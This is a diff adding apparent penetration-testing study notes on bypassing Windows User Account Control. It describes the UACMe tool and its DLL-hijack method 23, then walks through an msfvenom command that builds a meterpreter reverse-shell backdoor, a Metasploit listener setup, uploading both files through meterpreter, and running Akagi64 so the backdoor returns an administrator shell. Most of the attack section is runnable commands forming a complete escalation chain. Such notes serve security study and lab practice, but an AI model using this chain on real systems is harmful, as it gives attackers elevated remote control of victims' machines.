@@ -85,4 +85,76 @@ shell
   # That's UAC blocking the elevated priv. command
 ```
 
+### UACMe - Explanation 
 
+#### [Description](https://github.com/hfiref0x/UACME#uacme)
+- Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor.
+
+#### [Requirements](https://github.com/hfiref0x/UACME#system-requirements)
+- x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too).
+- Admin account (account/user in the Administrators Group) with UAC set on default settings required.
+
+#### [Usage](https://github.com/hfiref0x/UACME#usage)
+- 32-Bit: `akagi32 [Key] [Param]`
+- `64-Bit: akagi64 [Key] [Param]`
+- The **_Key_** value can be obtained from the "Keys (click to expand/collapse)" just below the usage header.
+- The **_Param_** value is an optional command (executable file name including full path) to run.
+  - This second parameter can be empty
+  - In this case the program will execute elevated cmd.exe from system32 folder.
+- We are going to be using Key 23 (works best in this scenario).
+  - `23. Author: Leo Davidson derivative`
+  - Type: Dll Hijack
+  - Method: IFileOperation
+  - Target(s): \system32\pkgmgr.exe
+  - Component(s): DismCore.dll
+  - Implementation: ucmDismMethod
+  - Works from: Windows 7 (7600)
+  - Fixed in: unfixed
+  - Code status: added in v2.5.1
+- Run examples:
+```
+akagi32.exe 23
+akagi64.exe 61
+akagi32 23 c:\windows\system32\calc.exe
+akagi64 61 c:\windows\system32\charmap.exe
+```
+
+**Note:** In real life you'll need to clone the repo and compile your own binaries ([see instructions](https://github.com/hfiref0x/UACME/tree/master#build) on the GitHub).
+
+### MSFVenom
+- You need to create a payload with MSFVenom and then transfer that to the target system.
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f exe > backdoor.exe
+```
+
+### Set up a Listener
+- You can use the MetaSploit handler:
+```
+> use multihandler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST [local ip]
+> set LPORT 1234
+> run
+```
+
+### Meterpreter: On the Target
+- Go back into your meterpreter session and upload the UACMe binary and your backdoor.exe file.
+```
+> cd C:\\
+> mkdir Temp
+> cd Temp
+> upload backdoor.exe
+> upload tools/UACME/Akagi64.exe
+> dir                             # should see both of those files
+```
+
+#### Problem
+- If you tried to execute backdoor.exe to get your reverse shell, you could not because UAC would block it (confirmation pop-up).
+- You need to BYPASS UAC FIRST, and that's what Akagi64.exe (with key 23) is for...
+
+#### Bypass UAC & Execute Backdoor
+- Get a shell on the target via your meterpreter session
+```
+> .\Akagi64.exe 23 C:\\Temp\backdoor.exe
+```
+- This should bypass UAC and give you the reverse shell on your listener (with administrator privs).
